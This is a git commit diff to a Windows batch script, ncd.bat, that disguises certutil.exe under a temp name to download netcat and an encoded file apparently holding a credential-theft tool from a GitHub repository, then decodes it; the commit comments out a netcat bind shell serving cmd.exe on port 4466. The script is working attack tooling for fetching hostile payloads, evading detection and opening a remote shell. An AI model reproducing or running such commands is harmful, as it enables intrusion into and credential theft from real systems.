0b97210fca84d5d34545ff422460f44eb5590897
inwestallis <inwestallis@gmail.com>
2021-03-28 19:25:27 +0300

    Update ncd.bat

--- ncd.bat
+++ ncd.bat
@@ -2,7 +2,7 @@
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
 %temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/nc64.exe %Temp%\nc.exe
 
-%Temp%\nc.exe -nLvp 4466 -e cmd.exe
+rem %Temp%\nc.exe -nLvp 4466 -e cmd.exe
 
 %temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/mim.b %Temp%\mim.b
 %temp%\cr.tmp -decode %Temp%\mim.b %Temp%\mim
